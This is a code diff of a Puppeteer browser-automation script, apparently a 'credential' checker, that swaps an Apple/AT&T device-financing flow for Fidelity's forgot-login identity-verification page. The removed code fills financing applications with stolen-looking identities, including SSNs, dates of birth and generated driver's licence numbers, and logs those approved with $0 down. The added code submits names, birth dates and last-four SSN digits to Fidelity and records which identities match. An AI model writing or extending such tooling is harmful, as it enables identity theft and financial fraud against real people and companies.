@@ -20,6 +20,7 @@ import { generateRandomNumberWithPrefix } from './utils/generate-random-number-w
 import { CreditCheckResponse } from './api/apple/interfaces/CreditCheckResponse';
 import { ValidateAddresResponse } from './api/apple/interfaces/ValidateAddresResponse';
 import { DownPaymentResponse } from './api/apple/interfaces/DownPaymentResponse';
+import { FidelitySearchResponse } from './api/fidelity/FidelitySearchResponse';
 
 export const TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS = minutesToMilliseconds(
   TIMEOUT_WAIT_FOR_NAVIGATION_MINUTES,
@@ -88,6 +89,7 @@ interface ConfigurationPerPage {
   xfinity: PageConfiguration;
   pilotflyingj: PageConfiguration;
   apple: PageConfiguration;
+  fidelity: PageConfiguration;
 }
 
 const CONFIGURATION_PER_PAGE: ConfigurationPerPage = {
@@ -107,75 +109,41 @@ const CONFIGURATION_PER_PAGE: ConfigurationPerPage = {
     loanAmountSelector: '#amount',
     formSelector: '#homepage-form',
   },
+  fidelity: {
+    pageUrl:
+      'https://nb.fidelity.com/public/nbpreloginnav/app/forgotlogindomestic#/forgotLoginDomestic/verifyIdentity',
+    loanAmountSelector: '#amount',
+    formSelector: '#homepage-form',
+  },
 };
 
 const generateInputNameSelector = (name: string) => `[name=${name}]`;
 
 const API_URLS = {
   apple: {
-    validateAddress:
-      '/preauth/api/validate-address',
+    validateAddress: '/preauth/api/validate-address',
     // validateAddress:
     //   '/WebObjects/IPACustomer.woa/wa/IPAPreAuthAction/api/validate-address',
     // creditCheck:
     //   '/WebObjects/IPACustomer.woa/wa/IPAPreAuthAction/api/credit-check',
-    creditCheck:
-      '/preauth/api/credit-check',
-    downPayment:
-      '/preauth/api/down_payment',
+    creditCheck: '/preauth/api/credit-check',
+    downPayment: '/preauth/api/down_payment',
     // downPayment:
     //   '/WebObjects/IPACustomer.woa/wa/IPAPreAuthAction/api/down_payment',
+  },
+  fidelity: {
+    search: 'https://ecaap.fidelity.com/user/identity/attributes/.search',
   },
 };
 
 const SELECTORS = {
-  emailInput: '#Email',
-  password: '#Password',
-  submitButton: '#loginForm > div > button',
-  userHint: '#user-hint',
-  passwdHint: '#passwd-hint',
-  paymentOptions: {
-    // finance: "[for='27309d31-6efe-11ee-8d1d-4dbb2e2b063b']",
-    finance:
-      '.rf-po-bfe-purchaseoptionsedit .rf-po-bfe-dimension-base:nth-child(2) input', // check
-    carrier: '.rf-po-bfe-tabpills-container > li:nth-child(3) > button',
-    att: '.rf-po-bfe-financingoptions-tabs-container > div:nth-child(3) > fieldset .rf-po-bfe-financingoption:nth-child(1) input',
-    no_apple_care: '#applecareplus_59_noapplecare_label',
-    continue_button: '.as-purchaseinfo-button button',
-  },
-  att_apply_page: {
-    newCustomer: 'input#NEW', // check
-    continue_button:
-      '#root > div.show > div > div > div > form > div.buttons-div.button-customer-selection > button',
-  },
-  apple_form: {
-    firstName: generateInputNameSelector('firstName'),
-    lastName: generateInputNameSelector('lastName'),
-    email: generateInputNameSelector('email'),
-    addressLine1: generateInputNameSelector('addressLine1'),
-    addressLine2: generateInputNameSelector('addressLine2'),
-    city: generateInputNameSelector('city'),
-    addressState: generateInputNameSelector('addressState'),
-    zipcode: generateInputNameSelector('zipcode'),
-    phonenumber: generateInputNameSelector('phonenumber'),
-    idnumber: generateInputNameSelector('idnumber'),
-    idState: generateInputNameSelector('idState'),
-    dateOfBirth: generateInputNameSelector('dateOfBirth'),
-    socialSecurity: generateInputNameSelector('socialSecurity'),
-    continue_button:
-      '#root > div.show > div > div > div > div > form:nth-child(2) > div.buttons-div > button:nth-child(2)',
-    suggestedAddressButton:
-      '#root > div.show > div > div > div > div > form:nth-child(1) > div > div > div > div > div > div > div.buttons-div.recommended-address-button > button',
-  },
-  apple_plan: {
-    installmentPlans: 'input[name=planSelection]',
-    continue_button:
-      '#root > div.show > div > div.as-l-container > div > div.page-body.page-body-margin > div > form > div.buttons-div > button:nth-child(2)',
-    continue_button_wireless:
-      '#root > div.show > div > div > div.page-body.page-body-margin > form > div.buttons-div > button:nth-child(2)',
-    continue_button_number_plan:
-      '#root > div.show > div > div > div.page-body.form-margin-top > form > div.buttons-div.button-port-in > button:nth-child(2)',
-  },
+  firstName: '#personFirstName',
+  lastName: '#personLastName',
+  month: '#dob-month-input',
+  day: '#dob-day-input',
+  year: '#dob-year-input',
+  last4ssn: '#lastFourOfSSN',
+  continue_button: '#nb-prelogin-submit-button',
 };
 
 // [...document.querySelectorAll("input[name=planSelection]")][1].click()
@@ -256,7 +224,7 @@ export const getCredentialInformationScrapper = async (
     headless: HEADLESS,
     // headless: false,
     // args: ['--proxy-server=162.244.132.210:6021'],
-    args: [`--proxy-server=${proxyConfig.host}:${proxyConfig.port}`],
+    // args: [`--proxy-server=${proxyConfig.host}:${proxyConfig.port}`],
   });
 
   // const page = await browser.newPage();
@@ -272,9 +240,7 @@ export const getCredentialInformationScrapper = async (
   await page.setRequestInterception(true);
 
   page.on('request', (request) => {
-    if (
-      ['image', 'font'].indexOf(request.resourceType()) !== -1
-    ) {
+    if (['image', 'font'].indexOf(request.resourceType()) !== -1) {
       // console.log('###Aborting non essential request to speed up site...');
       request.abort();
     } else {
@@ -288,7 +254,8 @@ export const getCredentialInformationScrapper = async (
 
   try {
     await page.goto(pageUrl, {
-      waitUntil: 'domcontentloaded',
+      // waitUntil: 'domcontentloaded',
+      waitUntil: 'networkidle0',
       timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
     });
 
@@ -342,292 +309,346 @@ export const getCredentialInformationScrapper = async (
 
     // await page.select(loanAmountSelector, loanAmountValue);
 
-    await page.waitForSelector(SELECTORS.paymentOptions.finance);
+    // await page.waitForSelector(SELECTORS.paymentOptions.finance);
 
-    await page.evaluate((SELECTORS) => {
-      const element = document?.querySelector(
-        SELECTORS.paymentOptions.finance,
-      ) as HTMLInputElement | null;
+    // await page.evaluate((SELECTORS) => {
+    //   const element = document?.querySelector(
+    //     SELECTORS.paymentOptions.finance,
+    //   ) as HTMLInputElement | null;
 
-      if (element) {
-        element.click();
-      }
-    }, SELECTORS);
+    //   if (element) {
+    //     element.click();
+    //   }
+    // }, SELECTORS);
 
-    await page.waitForSelector(SELECTORS.paymentOptions.carrier);
-
-    await page.evaluate((SELECTORS) => {
-      const element = document?.querySelector(
-        SELECTORS.paymentOptions.carrier,
-      ) as HTMLInputElement | null;
-
-      if (element) {
-        element.click();
-      }
-    }, SELECTORS);
-
-    await page.waitForSelector(SELECTORS.paymentOptions.att);
-
-    await page.evaluate((SELECTORS) => {
-      const element = document?.querySelector(
-        SELECTORS.paymentOptions.att,
-      ) as HTMLInputElement | null;
+    // await page.waitForSelector(SELECTORS.paymentOptions.carrier);
 
-      if (element) {
-        element.click();
-      }
-    }, SELECTORS);
+    // await page.evaluate((SELECTORS) => {
+    //   const element = document?.querySelector(
+    //     SELECTORS.paymentOptions.carrier,
+    //   ) as HTMLInputElement | null;
 
-    await new Promise((r) => setTimeout(r, 1500));
+    //   if (element) {
+    //     element.click();
+    //   }
+    // }, SELECTORS);
 
-    await page.waitForSelector(SELECTORS.paymentOptions.no_apple_care);
+    // await page.waitForSelector(SELECTORS.paymentOptions.att);
 
-    await page.evaluate((SELECTORS) => {
-      const element = document?.querySelector(
-        SELECTORS.paymentOptions.no_apple_care,
-      ) as HTMLInputElement | null;
+    // await page.evaluate((SELECTORS) => {
+    //   const element = document?.querySelector(
+    //     SELECTORS.paymentOptions.att,
+    //   ) as HTMLInputElement | null;
 
-      if (element) {
-        element.click();
-        element.click();
-      }
-    }, SELECTORS);
+    //   if (element) {
+    //     element.click();
+    //   }
+    // }, SELECTORS);
 
-    await new Promise((r) => setTimeout(r, 2000));
+    // await new Promise((r) => setTimeout(r, 1500));
 
-    await page.waitForSelector(SELECTORS.paymentOptions.continue_button);
+    // await page.waitForSelector(SELECTORS.paymentOptions.no_apple_care);
 
-    await page.evaluate((SELECTORS) => {
-      const element = document?.querySelector(
-        SELECTORS.paymentOptions.continue_button,
-      ) as HTMLInputElement | null;
+    // await page.evaluate((SELECTORS) => {
+    //   const element = document?.querySelector(
+    //     SELECTORS.paymentOptions.no_apple_care,
+    //   ) as HTMLInputElement | null;
 
-      if (element) {
-        element.click();
-      }
-    }, SELECTORS);
+    //   if (element) {
+    //     element.click();
+    //     element.click();
+    //   }
+    // }, SELECTORS);
 
-    await Promise.all([
-      // await page.click(SELECTORS.submitButton),
-      await page.waitForNavigation({
-        timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
-        waitUntil: 'domcontentloaded',
-      }),
-    ]);
+    // await new Promise((r) => setTimeout(r, 2000));
 
-    await page.waitForSelector(SELECTORS.att_apply_page.newCustomer);
+    // await page.waitForSelector(SELECTORS.paymentOptions.continue_button);
 
-    await page.evaluate((SELECTORS) => {
-      const element = document?.querySelector(
-        SELECTORS.att_apply_page.newCustomer,
-      ) as HTMLInputElement | null;
+    // await page.evaluate((SELECTORS) => {
+    //   const element = document?.querySelector(
+    //     SELECTORS.paymentOptions.continue_button,
+    //   ) as HTMLInputElement | null;
 
-      if (element) {
-        element.click();
-      }
-    }, SELECTORS);
-
-    await page.waitForSelector(SELECTORS.att_apply_page.continue_button);
-
-    await page.evaluate((SELECTORS) => {
-      const element = document?.querySelector(
-        SELECTORS.att_apply_page.continue_button,
-      ) as HTMLInputElement | null;
-
-      if (element) {
-        element.click();
-      }
-    }, SELECTORS);
-
-    // await page.waitForNetworkIdle();
-
-    // console.log('ready to set data on form!');
-
-    await page.waitForSelector(SELECTORS.apple_form.firstName);
-
-    const driverLicenceGenerated = getDriverLicense(
-      credential.state as DriverLicenceState,
-    );
-
-    await page.type(SELECTORS.apple_form.firstName, credential.name);
-    await page.type(SELECTORS.apple_form.lastName, credential.lastname);
-    await page.type(SELECTORS.apple_form.email, credential.email);
-    await page.type(SELECTORS.apple_form.addressLine1, credential.address);
-    await page.type(SELECTORS.apple_form.addressState, credential.state);
-    await page.type(SELECTORS.apple_form.city, credential.city);
-    await page.type(SELECTORS.apple_form.idState, credential.state);
-    await page.type(SELECTORS.apple_form.zipcode, credential.zipCode);
-    await page.type(SELECTORS.apple_form.phonenumber, credential.phoneNumber);
-    await page.type(SELECTORS.apple_form.idnumber, driverLicenceGenerated);
-    await page.type(SELECTORS.apple_form.idState, credential.state);
-
-    console.log(formatBid(credential.bid));
-
-    await page.type(
-      SELECTORS.apple_form.dateOfBirth,
-      formatBid(credential.bid),
-    );
-
-    await page.type(SELECTORS.apple_form.socialSecurity, credential.ssn);
-
-    await page.waitForSelector(SELECTORS.apple_form.continue_button);
-
-    await page.click(SELECTORS.apple_form.continue_button);
-
-    const originURL = new URL(page.url()).origin;
-
-    const validateAddressResponse = (await (
-      await page.waitForResponse(originURL + API_URLS.apple.validateAddress, {
-        timeout: TIMEOUT_WAIT_FOR_RESPONSE_APPLE,
-      })
-    ).json()) as ValidateAddresResponse;
-
-    if (validateAddressResponse.data.globalAddress.matchStatus === 'EXACT') {
-      //GOOOOOD
-
-      console.log('GOOD Address');
-    } else {
-      console.log('suggested Address');
-
-      await page.waitForSelector(SELECTORS.apple_form.suggestedAddressButton);
-
-      await new Promise((r) => setTimeout(r, 1500));
-
-      await page.click(SELECTORS.apple_form.suggestedAddressButton);
-    }
-
-    const creditCheckResponse = (await (
-      await page.waitForResponse(originURL + API_URLS.apple.creditCheck, {
-        timeout: TIMEOUT_WAIT_FOR_RESPONSE_APPLE,
-      })
-    ).json()) as CreditCheckResponse;
-
-    if (creditCheckResponse.nextPage === 'getInstallmentPlans') {
-      //GOOOOOD
-
-      console.log('GOOD CREDIT');
-
-      await page.waitForSelector(SELECTORS.apple_plan.installmentPlans);
-
-      const installmentPlansElements = await page.$$(
-        SELECTORS.apple_plan.installmentPlans,
-      );
-
-      await installmentPlansElements[1].click();
-
-      await new Promise((r) => setTimeout(r, 1500));
-
-      await page.waitForSelector(SELECTORS.apple_plan.continue_button);
-
-      await page.click(SELECTORS.apple_plan.continue_button);
-
-      await page.waitForSelector('[name=portin-type]');
-
-      await page.evaluate(() => {
-        (
-          document.querySelectorAll('[name=portin-type]')[1] as HTMLInputElement
-        )?.click();
-      });
-
-      await new Promise((r) => setTimeout(r, 1500));
-
-      // button continue click after select number
-      await page.waitForSelector(
-        SELECTORS.apple_plan.continue_button_number_plan,
-      );
-
-      await page.click(SELECTORS.apple_plan.continue_button_number_plan);
-
-      await page.waitForSelector(SELECTORS.apple_plan.installmentPlans);
-
-      const installmentPlansWirelessElements = await page.$$(
-        SELECTORS.apple_plan.installmentPlans,
-      );
-
-      await installmentPlansWirelessElements[2].click();
-
-      await new Promise((r) => setTimeout(r, 1500));
-
-      await page.waitForSelector(SELECTORS.apple_plan.continue_button_wireless);
-
-      await page.click(SELECTORS.apple_plan.continue_button_wireless);
-
-      const originDownPaymentURL = new URL(page.url()).origin;
-
-      const downPaymentResponse = (await (
-        await page.waitForResponse(
-          originDownPaymentURL + API_URLS.apple.downPayment,
-          {
-            timeout: TIMEOUT_WAIT_FOR_RESPONSE_APPLE,
-          },
-        )
-      ).json()) as DownPaymentResponse;
-
-      ///               Down Payment validation block              ///
-      if (downPaymentResponse.data.downPayment === '$0') {
-        const outputMessage = generateOutputMessage(
-          credential,
-          page.url(),
-          driverLicenceGenerated,
-        );
-
-        logger.info(outputMessage);
-
-        validWriteLineOnFile(outputMessage);
-      } else {
-        const outputMessage = generateOutputMessage(
-          credential,
-          page.url(),
-          driverLicenceGenerated,
-          downPaymentResponse.data.downPayment,
-        );
-
-        logger.error(outputMessage);
-
-        invalidWriteLineOnFile(outputMessage);
-      }
-      ///               Down Payment validation block              ///
-    } else {
-      const outputMessage = generateOutputMessage(
-        credential,
-        page.url(),
-        driverLicenceGenerated,
-      );
-
-      logger.error(outputMessage);
-
-      invalidWriteLineOnFile(outputMessage);
-    }
+    //   if (element) {
+    //     element.click();
+    //   }
+    // }, SELECTORS);
 
     // await Promise.all([
-    //   await page.click(SELECTORS.submitButton),
+    //   // await page.click(SELECTORS.submitButton),
     //   await page.waitForNavigation({
     //     timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
     //     waitUntil: 'domcontentloaded',
     //   }),
     // ]);
 
-    await new Promise((r) => setTimeout(r, 3000));
+    // await page.waitForSelector(SELECTORS.att_apply_page.newCustomer);
 
-    // if (page.url().includes('home')) {
-    //   const outputMessage = generateOutputMessage(credential, page.url(), ip);
+    // await page.evaluate((SELECTORS) => {
+    //   const element = document?.querySelector(
+    //     SELECTORS.att_apply_page.newCustomer,
+    //   ) as HTMLInputElement | null;
 
-    //   logger.info(outputMessage);
+    //   if (element) {
+    //     element.click();
+    //   }
+    // }, SELECTORS);
 
-    //   validWriteLineOnFile(outputMessage);
+    // await page.waitForSelector(SELECTORS.att_apply_page.continue_button);
+
+    // await page.evaluate((SELECTORS) => {
+    //   const element = document?.querySelector(
+    //     SELECTORS.att_apply_page.continue_button,
+    //   ) as HTMLInputElement | null;
+
+    //   if (element) {
+    //     element.click();
+    //   }
+    // }, SELECTORS);
+
+    // // await page.waitForNetworkIdle();
+
+    // // console.log('ready to set data on form!');
+
+    // await page.waitForSelector(SELECTORS.apple_form.firstName);
+
+    // const driverLicenceGenerated = getDriverLicense(
+    //   credential.state as DriverLicenceState,
+    // );
+
+    const date = new Date(credential.bid);
+
+    const month =
+      String(date.getMonth()).length === 1
+        ? '0' + String(date.getMonth())
+        : String(date.getMonth());
+
+    const day =
+      String(date.getDay()).length === 1
+        ? '0' + String(date.getDay())
+        : String(date.getDay());
+
+    console.log({
+      getMonth: date.getMonth(),
+      getDay: date.getDay(),
+      getFullYear: date.getFullYear(),
+      month,
+      day,
+    });
+
+    await page.type(SELECTORS.firstName, credential.name);
+    await page.type(SELECTORS.lastName, credential.lastname);
+    await page.select(SELECTORS.month, month);
+    await page.type(SELECTORS.day, day);
+    await page.type(SELECTORS.year, String(date.getFullYear()));
+    await page.type(SELECTORS.last4ssn, credential.last4ssn);
+
+    await new Promise((r) => setTimeout(r, 2000));
+
+    await page.click(SELECTORS.continue_button);
+
+    const validateSearchResponse = (await (
+      await page.waitForResponse(API_URLS.fidelity.search, {
+        timeout: TIMEOUT_WAIT_FOR_RESPONSE_APPLE,
+      })
+    )?.json()) as FidelitySearchResponse;
+    // const validateSearchResponse = (await (
+    //   await page.waitForRequest(API_URLS.fidelity.search, {
+    //     timeout: TIMEOUT_WAIT_FOR_RESPONSE_APPLE,
+    //   })
+    // )
+    //   .response()
+    //   ?.json()) as FidelitySearchResponse;
+
+    console.log(validateSearchResponse);
+
+    const outputMessage = generateOutputMessage(
+      credential,
+      page.url(),
+      validateSearchResponse?.responseBaseInfo?.status?.message,
+    );
+
+    validWriteLineOnFile(outputMessage);
+
+    // await page.type(SELECTORS., String(date.getFullYear()));
+    // await page.type(SELECTORS.apple_form.lastName, credential.lastname);
+    // await page.type(SELECTORS.apple_form.email, credential.email);
+    // await page.type(SELECTORS.apple_form.addressLine1, credential.address);
+    // await page.type(SELECTORS.apple_form.addressState, credential.state);
+    // await page.type(SELECTORS.apple_form.city, credential.city);
+    // await page.type(SELECTORS.apple_form.idState, credential.state);
+    // await page.type(SELECTORS.apple_form.zipcode, credential.zipCode);
+    // await page.type(SELECTORS.apple_form.phonenumber, credential.phoneNumber);
+    // await page.type(SELECTORS.apple_form.idnumber, driverLicenceGenerated);
+    // await page.type(SELECTORS.apple_form.idState, credential.state);
+
+    // console.log(formatBid(credential.bid));
+
+    // await page.type(
+    //   SELECTORS.apple_form.dateOfBirth,
+    //   formatBid(credential.bid),
+    // );
+
+    // await page.type(SELECTORS.apple_form.socialSecurity, credential.ssn);
+
+    // await page.waitForSelector(SELECTORS.apple_form.continue_button);
+
+    // await page.click(SELECTORS.apple_form.continue_button);
+
+    // const originURL = new URL(page.url()).origin;
+
+    // const validateAddressResponse = (await (
+    //   await page.waitForResponse(originURL + API_URLS.apple.validateAddress, {
+    //     timeout: TIMEOUT_WAIT_FOR_RESPONSE_APPLE,
+    //   })
+    // ).json()) as ValidateAddresResponse;
+
+    // if (validateAddressResponse.data.globalAddress.matchStatus === 'EXACT') {
+    //   //GOOOOOD
+
+    //   console.log('GOOD Address');
     // } else {
-    //   const outputMessage = generateOutputMessage(credential, page.url(), ip);
+    //   console.log('suggested Address');
+
+    //   await page.waitForSelector(SELECTORS.apple_form.suggestedAddressButton);
+
+    //   await new Promise((r) => setTimeout(r, 1500));
+
+    //   await page.click(SELECTORS.apple_form.suggestedAddressButton);
+    // }
+
+    // const creditCheckResponse = (await (
+    //   await page.waitForResponse(originURL + API_URLS.apple.creditCheck, {
+    //     timeout: TIMEOUT_WAIT_FOR_RESPONSE_APPLE,
+    //   })
+    // ).json()) as CreditCheckResponse;
+
+    // if (creditCheckResponse.nextPage === 'getInstallmentPlans') {
+    //   //GOOOOOD
+
+    //   console.log('GOOD CREDIT');
+
+    //   await page.waitForSelector(SELECTORS.apple_plan.installmentPlans);
+
+    //   const installmentPlansElements = await page.$$(
+    //     SELECTORS.apple_plan.installmentPlans,
+    //   );
+
+    //   await installmentPlansElements[1].click();
+
+    //   await new Promise((r) => setTimeout(r, 1500));
+
+    //   await page.waitForSelector(SELECTORS.apple_plan.continue_button);
+
+    //   await page.click(SELECTORS.apple_plan.continue_button);
+
+    //   await page.waitForSelector('[name=portin-type]');
+
+    //   await page.evaluate(() => {
+    //     (
+    //       document.querySelectorAll('[name=portin-type]')[1] as HTMLInputElement
+    //     )?.click();
+    //   });
+
+    //   await new Promise((r) => setTimeout(r, 1500));
+
+    //   // button continue click after select number
+    //   await page.waitForSelector(
+    //     SELECTORS.apple_plan.continue_button_number_plan,
+    //   );
+
+    //   await page.click(SELECTORS.apple_plan.continue_button_number_plan);
+
+    //   await page.waitForSelector(SELECTORS.apple_plan.installmentPlans);
+
+    //   const installmentPlansWirelessElements = await page.$$(
+    //     SELECTORS.apple_plan.installmentPlans,
+    //   );
+
+    //   await installmentPlansWirelessElements[2].click();
+
+    //   await new Promise((r) => setTimeout(r, 1500));
+
+    //   await page.waitForSelector(SELECTORS.apple_plan.continue_button_wireless);
+
+    //   await page.click(SELECTORS.apple_plan.continue_button_wireless);
+
+    //   const originDownPaymentURL = new URL(page.url()).origin;
+
+    //   const downPaymentResponse = (await (
+    //     await page.waitForResponse(
+    //       originDownPaymentURL + API_URLS.apple.downPayment,
+    //       {
+    //         timeout: TIMEOUT_WAIT_FOR_RESPONSE_APPLE,
+    //       },
+    //     )
+    //   ).json()) as DownPaymentResponse;
+
+    //   ///               Down Payment validation block              ///
+    //   if (downPaymentResponse.data.downPayment === '$0') {
+    //     const outputMessage = generateOutputMessage(
+    //       credential,
+    //       page.url(),
+    //       driverLicenceGenerated,
+    //     );
+
+    //     logger.info(outputMessage);
+
+    //     validWriteLineOnFile(outputMessage);
+    //   } else {
+    //     const outputMessage = generateOutputMessage(
+    //       credential,
+    //       page.url(),
+    //       driverLicenceGenerated,
+    //       downPaymentResponse.data.downPayment,
+    //     );
+
+    //     logger.error(outputMessage);
+
+    //     invalidWriteLineOnFile(outputMessage);
+    //   }
+    //   ///               Down Payment validation block              ///
+    // } else {
+    //   const outputMessage = generateOutputMessage(
+    //     credential,
+    //     page.url(),
+    //     driverLicenceGenerated,
+    //   );
 
     //   logger.error(outputMessage);
 
     //   invalidWriteLineOnFile(outputMessage);
     // }
 
-    if (SCREENSHOT_DISABLED) {
-      await page.screenshot({
-        path: screenshotRedirectPath,
-      });
-    }
+    // // await Promise.all([
+    // //   await page.click(SELECTORS.submitButton),
+    // //   await page.waitForNavigation({
+    // //     timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
+    // //     waitUntil: 'domcontentloaded',
+    // //   }),
+    // // ]);
+
+    // await new Promise((r) => setTimeout(r, 3000));
+
+    // // if (page.url().includes('home')) {
+    // //   const outputMessage = generateOutputMessage(credential, page.url(), ip);
+
+    // //   logger.info(outputMessage);
+
+    // //   validWriteLineOnFile(outputMessage);
+    // // } else {
+    // //   const outputMessage = generateOutputMessage(credential, page.url(), ip);
+
+    // //   logger.error(outputMessage);
+
+    // //   invalidWriteLineOnFile(outputMessage);
+    // // }
+
+    // if (SCREENSHOT_DISABLED) {
+    //   await page.screenshot({
+    //     path: screenshotRedirectPath,
+    //   });
+    // }
   } catch (error) {
     console.error(error);
     logTracking(
